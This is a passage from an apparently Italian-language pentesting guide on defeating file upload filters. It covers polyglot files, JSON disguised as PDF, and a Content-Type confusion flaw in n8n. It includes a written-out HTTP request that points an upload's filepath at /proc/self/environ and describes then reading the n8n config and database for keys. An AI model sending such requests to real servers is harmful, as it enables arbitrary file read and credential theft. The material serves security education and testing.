Un'esplorazione dettagliata di questa tecnica, inclusa la metodologia e le possibili applicazioni, è fornita nel seguente articolo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Questa risorsa offre una comprensione completa del processo e delle sue implicazioni.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

I file polyglot sono uno strumento unico in cybersecurity, funzionando come camaleonti che possono esistere validamente in più formati contemporaneamente. Un esempio interessante è un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un ibrido che funziona sia come GIF sia come archivio RAR. Questi file non sono limitati a questa combinazione; sono possibili anche accoppiamenti come GIF e JS o PPT e JS.

L'utilità principale dei polyglot risiede nella loro capacità di eludere misure di sicurezza che filtrano i file in base al tipo. È pratica comune in molte applicazioni permettere soltanto determinati tipi di file in upload — come JPEG, GIF o DOC — per mitigare il rischio rappresentato da formati potenzialmente dannosi (es. JS, PHP o Phar). Tuttavia, un polyglot, conformandosi ai criteri strutturali di più formati, può aggirare silenziosamente queste restrizioni.

Nonostante la loro adattabilità, i polyglot incontrano dei limiti. Per esempio, mentre un polyglot potrebbe incarnare simultaneamente un file PHAR (PHp ARchive) e un JPEG, il successo dell'upload potrebbe dipendere dalle politiche sulle estensioni del sistema. Se il sistema è rigoroso riguardo alle estensioni consentite, la mera dualità strutturale di un polyglot potrebbe non essere sufficiente per garantirne l'upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Caricare JSON validi come se fossero PDF

Come evitare le rilevazioni del tipo di file caricando un file JSON valido anche se non consentito, fingendo che sia un PDF (tecniche da **[questo post del blog](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Finché i magic bytes `%PDF` sono nei primi 1024 byte è considerato valido (vedi esempio nel post)
- **`pdflib` library**: Aggiungi un finto formato PDF all'interno di un campo del JSON in modo che la library pensi sia un pdf (vedi esempio nel post)
- **`file` binary**: Può leggere fino a 1048576 byte da un file. Basta creare un JSON più grande di tale dimensione in modo che non riesca a parsare il contenuto come JSON e poi inserire all'interno del JSON la parte iniziale di un PDF reale e il binario penserà che sia un PDF

### Content-Type confusion to arbitrary file read

Alcuni upload handlers **trust the parsed request body** (es., `context.getBodyData().files`) e successivamente **copiano il file da `file.filepath`** senza prima imporre `Content-Type: multipart/form-data`. Se il server accetta `application/json`, puoi fornire un oggetto `files` finto che punti `filepath` a **qualsiasi percorso locale**, trasformando il flusso di upload in una primitiva per la lettura arbitraria di file.

Example POST against a form workflow returning the uploaded binary in the HTTP response:
```http
POST /form/vulnerable-form HTTP/1.1
Host: target
Content-Type: application/json

{
"files": {
"document": {
"filepath": "/proc/self/environ",
"mimetype": "image/png",
"originalFilename": "x.png"
}
}
}
```
Backend copia `file.filepath`, quindi la risposta restituisce il contenuto di quel percorso. Sequenza comune: leggere `/proc/self/environ` per ottenere `$HOME`, poi `$HOME/.n8n/config` per le chiavi e `$HOME/.n8n/database.sqlite` per gli identificatori utente.

## Riferimenti

- [n8n form upload Content-Type confusion → arbitrary file read PoC](https://github.com/Chocapikk/CVE-2026-21858)
- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
